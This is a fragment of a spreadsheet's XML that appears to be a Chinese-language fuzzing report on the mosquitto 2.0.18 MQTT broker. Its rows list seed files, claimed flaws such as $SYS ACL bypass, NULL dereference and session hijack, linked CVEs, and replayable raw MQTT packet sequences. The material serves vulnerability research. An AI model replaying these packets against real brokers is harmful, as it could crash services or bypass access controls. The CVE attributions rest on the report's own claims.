          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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2">
      <c r="A682" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B682" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C682" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(286B)\u000a4.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82" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 880B (报告+请求数据)\u000a请求数据: 286B\u000a\u000a---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MQTT请求序列(286B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=959 Topics=[''(零长度!QoS=3)] | raw_header=825e03bf00000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='sensor/temp' QoS=2 retain=True payload_len=115B | raw_header=3d8001000b73656e736f722f74656d70\u000aMsg[3]: (不完整,59B) raw=104500044d515454f01d191b15fd0865010e00216c6c546f7069633d77742057696c6c000265726e\u000a(尾部59B): 104500044d515454f01d191b15fd0865010e00216c6c546f7069633d77742057696c6c000265726e616c16000d122da84b29</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J68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8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683">
      <c r="A683" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B683" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C683" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(168B)\u000a4.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83" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 910B (报告+请求数据)\u000a请求数据: 168B\u000a\u000a---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MQTT请求序列(168B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1504 Topics=[''(零长度!QoS=1)] | raw_header=821e05e00000152473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=100B | raw_header=398301001d245359532f62726f6b6572\u000aMsg[3]: (不完整,2B) raw=fff1\u000a(尾部2B): fff1</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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4">
      <c r="A684" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B684" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C684" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(187B)\u000a4.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684" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c6 ===\u000a大小: 1107B (报告+请求数据)\u000a请求数据: 187B\u000a\u000a---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MQTT请求序列(187B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='' QoS=2 retain=False payload='\x00\x15helÂ\x00' | raw_header=34090000001568656cc200\u000aMsg[2]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36281100000e1021ffff270fffffff22\u000aMsg[3]: TYPE0  | raw_header=000b61666c6e65745f66757a7a\u000aMsg[4]: TYPE0  | raw_header=000c66757a7a5f76355f75736572\u000aMsg[5]: TYPE0  | raw_header=000c66757a7a5f76355f70617373\u000aMsg[6]: SUBSCRIBE PacketID=2579 Topics=[''(零长度!QoS=1)] | raw_header=821b0a130000152473686172652f6772\u000aMsg[7]: PUBLISH Topic='$SYT\x05Â\x00&lt;(\x11\x00\x00\x0e\x10!ÿÿ'\x0fÿÿÿ"\x00\u000a\x19\x00\x17\x01' QoS=2 retain=False payload='&amp;\x00\u000dmbfuzzer_syn' | raw_header=3c2e001d2453595405c2003c28110000\u000aMsg[8]: CONNECT  | raw_header=1000\u000aMsg[9]: (不完整,14B) raw=027635000b000a191568656c6c6f\u000a(尾部14B): 027635000b000a191568656c6c6f</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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5">
      <c r="A685" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B685" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C685" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(701B)\u000a4.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85" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 1026B (报告+请求数据)\u000a请求数据: 701B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(701B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=00347171717171717171717171717171\u000aMsg[2]: PUBCOMP PacketID=42555 | raw_header=7171a63b717171717171717171717171\u000aMsg[3]: PINGREQ  | raw_header=c000\u000aMsg[4]: PUBCOMP PacketID=29041 | raw_header=71717171717171717171717171717171\u000aMsg[5]: PUBCOMP PacketID=29041 | raw_header=71717171717171717171717171717171\u000aMsg[6]: AUTH  | raw_header=f802000c\u000aMsg[7]: PUBREL PacketID=31354 | raw_header=66757a7a5f76355f75736572000c6675\u000aMsg[8]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload_len=72B | raw_header=3a5d0013245359532f62726f6b65722f\u000aMsg[9]: TYPE0  | raw_header=0402003c\u000aMsg[10]: TYPE0  | raw_header=000766656c332f6c65\u000aMsg[11]: (不完整,69B) raw=76656c34100007184f92bacf72ce0300012379061c0134090000001568656c6c6f31220013612f62\u000a(尾部69B): 76656c34100007184f92bacf72ce0300012379061c0134090000001568656c6c6f31220013612f622f632f642f652f662f67</f>
        <v/>
      </c>
      <c r="F6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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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6">
      <c r="A686" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B686" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C686" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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86" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 854B (报告+请求数据)\u000a请求数据: 240B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(240B原始二进制) ---\u000aMsg[1]: PUBACK  | raw_header=4000\u000aMsg[2]: SUBSCRIBE PacketID=48 Topics=[] | raw_header=827300303626001c2473686172652f67\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=88B | raw_header=3277001d245359532f62726f6b65722f</f>
        <v/>
      </c>
      <c r="F6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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J68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7">
      <c r="A687" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B687" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C687" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(842B)\u000a4.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687" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 1501B (报告+请求数据)\u000a请求数据: 842B\u000a\u000a---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MQTT请求序列(842B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2600\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[3]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626262626260c262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=262626263e2626262626262626262626\u000aMsg[5]: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raw_header=26082626262626262626\u000aMsg[9]: CONNACK session_present=38 reason_code=38 | raw_header=262626262626267f2626262626262626\u000aMsg[10]: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raw_header=26262626262626262626262626062626\u000aMsg[14]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626262e262626262626\u000aMsg[15]: CONNACK session_present=38 reason_code=52 | raw_header=26262634262626262626262626262626\u000aMsg[16]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626264026262626262626\u000aMsg[17]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[18]: CONNACK session_present=37 reason_code=26 | raw_header=2626251a262626262626262626262626\u000aMsg[19]: PUBREC PacketID=22873 | raw_header=59595959595955595959595959595959\u000aMsg[20]: PUBREC PacketID=22873 | raw_header=59595959595959595962595959595959\u000aMsg[21]: (不完整,8B) raw=2626262c26cb8c01\u000a(尾部8B): 2626262c26cb8c01</f>
        <v/>
      </c>
      <c r="F6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8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87" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J68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8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88">
      <c r="A688" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:00c2</t>
        </is>
      </c>
      <c r="B688" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C688" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000008,sev:3,cat:00c2)中的REQUEST DATA提取出来(17821B)\u000a4.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688" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c2 ===\u000a大小: 5668B (报告+请求数据)\u000a请求数据: 17821B\u000a\u000a---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MQTT请求序列(17821B原始二进制) ---\u000aMsg[1]: CONNACK session_present=16 reason_code=33 | raw_header=230e1021ffff270fffffff2226262626\u000aMsg[2]: CONNACK  | raw_header=2600\u000aMsg[3]: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session_present=67 reason_code=38 | raw_header=26264326262626262626262626262626\u000aMsg[19]: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raw_header=26262626262626262626262626262626\u000a(尾部4062B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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8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89">
      <c r="A689" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B689" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C689" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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89" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 438B (报告+请求数据)\u000a请求数据: 53B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(53B原始二进制) ---\u000aMsg[1]: CONNECT Proto=\x82\x0b\x00\x00\x10\x06tent/#\x004\x0f\x00 v6 ClientID=''(0B) clean_session=False keepalive=0s Will=YES [持久会话] | raw_header=10150010820b0000100674656e742f23\u000aMsg[2]: (不完整,30B) raw=73742f23000468656c6c6f7d020001a20a10020006746573742f23c000e7\u000a(尾部30B): 73742f23000468656c6c6f7d020001a20a10020006746573742f23c000e7</f>
        <v/>
      </c>
      <c r="F6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89" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J6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8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90">
      <c r="A690" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B690" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C690" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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90" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0181 ===\u000a大小: 799B (报告+请求数据)\u000a请求数据: 86B\u000a\u000a---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MQTT请求序列(86B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=39393939393939393939393939393939\u000aMsg[2]: (不完整,27B) raw=737373737373737373737373737373731b2f74655b742f81818169\u000a(尾部27B): 737373737373737373737373737373731b2f74655b742f81818169</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J6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9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91">
      <c r="A691" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0182</t>
        </is>
      </c>
      <c r="B691" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C691" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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691" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0182 ===\u000a大小: 773B (报告+请求数据)\u000a请求数据: 60B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev2】MQTT: Empty client ID (session collision risk) (Cat=0x0100 Hash=0x0bf84835 CVE=N/A)\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a\u000a--- MQTT请求序列(60B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=127s Will=YES WillTopic='$SYS/broker/clients/connected' [自动清理会话] | raw_header=103900044d5154540416007f0000001d\u000aMsg[2]: PUBACK  | raw_header=4c</f>
        <v/>
      </c>
      <c r="F6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9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91" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J69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69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92">
      <c r="A692" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B692" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C692" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(283B)\u000a4.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692" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0183 ===\u000a大小: 1143B (报告+请求数据)\u000a请求数据: 283B\u000a\u000a---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MQTT请求序列(283B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=154 Topics=[] | raw_header=825e009a2426000a746573742f746f70\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=152B | raw_header=39b701001d245359532f62726f6b6572\u000aMsg[3]: UNSUBACK  | raw_header=b5</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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9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93">
      <c r="A693" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B693" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C693" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(1291B)\u000a4.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693" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:01c1 ===\u000a大小: 2010B (报告+请求数据)\u000a请求数据: 1291B\u000a\u000a---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MQTT请求序列(1291B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=9766 | raw_header=4d262626262626262626262626262626\u000aMsg[2]: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(不完整,731B) raw=26822f007200001c2473686172652f67332f686f6d652f2b2f74656d706572617475726514000a74\u000a(尾部731B): 26822f007200001c2473686172652f67332f686f6d652f2b2f74656d706572617475726514000a746573742f746f70696325</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J69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9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94">
      <c r="A694" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B694" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C694" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(688B)\u000a4.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694" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 1177B (报告+请求数据)\u000a请求数据: 688B\u000a\u000a---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MQTT请求序列(688B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=20 Topics=['/'(QoS=1)] | raw_header=8206001400012f01\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3409656565656565656565\u000aMsg[3]: PUBREL PacketID=25957 | raw_header=65656565656565656565656565656565\u000aMsg[4]: PINGREQ  | raw_header=c000\u000aMsg[5]: TYPE0  | raw_header=000d6d6266757a7a65725f73796e63\u000aMsg[6]: TYPE0  | raw_header=00027635\u000aMsg[7]: TYPE0  | raw_header=000b61666c6e65745f66757a7a\u000aMsg[8]: TYPE0  | raw_header=000c66757a7a5f01355f75736572\u000aMsg[9]: TYPE0  | raw_header=000c66757a7a5f76355f70617373\u000aMsg[10]: SUBSCRIBE PacketID=2563 Topics=[] | raw_header=822d0a031a2600152473686172652f67\u000aMsg[11]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=128B | raw_header=3a9f01001d245359532f62726f6b6572\u000aMsg[12]: PUBLISH Topic='MQTT' QoS=2 retain=False payload_len=86B | raw_header=345c00044d51545405c2003c28110000\u000aMsg[13]: SUBSCRIBE PacketID=1991 Topics=[] | raw_header=823507c7050b9da18229001424736861\u000aMsg[14]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=355f7573657200696f6e223cbb01000b\u000aMsg[15]: PUBCOMP PacketID=25455 | raw_header=732f636f6e6e656325e9b483ffcbc5f7</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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9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95">
      <c r="A695" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B695" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C695" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(118B)\u000a4.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95" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 1608B (报告+请求数据)\u000a请求数据: 118B\u000a\u000a---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MQTT请求序列(118B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2300\u000aMsg[2]: TYPE0  | raw_header=00101300044d5154540402f23c000769\u000aMsg[3]: AUTH  | raw_header=ff270fffffff220080ffff62022911e2\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e2160013612f622f632f642f652f662f\u000aMsg[5]: PUBLISH Topic='+/+/+' QoS=1 retain=False payload='\x00\x17\x00\x01\x02\x03' | raw_header=320d00052b2f2b2f2b001700010203\u000aMsg[6]: TYPE0  | raw_header=000100\u000aMsg[7]: (不完整,15B) raw=0011000000001f00066e6f726d616c\u000a(尾部15B): 0011000000001f00066e6f726d616c</f>
        <v/>
      </c>
      <c r="F6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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J69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69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696">
      <c r="A696" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B696" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C696" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(373B)\u000a4.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696" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:02c4 ===\u000a大小: 1619B (报告+请求数据)\u000a请求数据: 373B\u000a\u000a---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MQTT请求序列(373B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=25186 | raw_header=62626262626262626262626262626262\u000aMsg[2]: TYPE0  | raw_header=0100\u000aMsg[3]: TYPE0  | raw_header=00262626262626262626262626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: PUBREC PacketID=30074 | raw_header=5f66757a7a000c66757a7a5f76351386\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: (不完整,85B) raw=15685f6c806f31220013612f712f6300027635000b61666c266572736f3122001361000004000002\u000a(尾部85B): 15685f6c806f31220013612f712f6300027635000b61666c266572736f31220013610000040000027635000b61666c266572</f>
        <v/>
      </c>
      <c r="F6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9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96" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J69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696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97">
      <c r="A697" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B697" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C697" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(32067B)\u000a4.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0x0305\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E697" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0305 ===\u000a大小: 6427B (报告+请求数据)\u000a请求数据: 32067B\u000a\u000a---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MQTT请求序列(32067B原始二进制) ---\u000aMsg[1]: PUBACK PacketID=21588 | raw_header=4d515454040080ff000000000000004b\u000aMsg[2]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[3]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[4]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[5]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[7]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[8]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[9]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[10]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[11]: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raw_header=36363636363636363636363636363636\u000aMsg[16]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[17]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[18]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[19]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[20]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[21]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[22]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[23]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[24]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[25]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000a(尾部2707B): 3636363636363636363636363636363636363636367636363636363636363636363636363636363636363636363636363636</f>
        <v/>
      </c>
      <c r="F6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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J69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9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98">
      <c r="A698" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000008,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B698" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C698" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(10247B)\u000a4.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698" s="2">
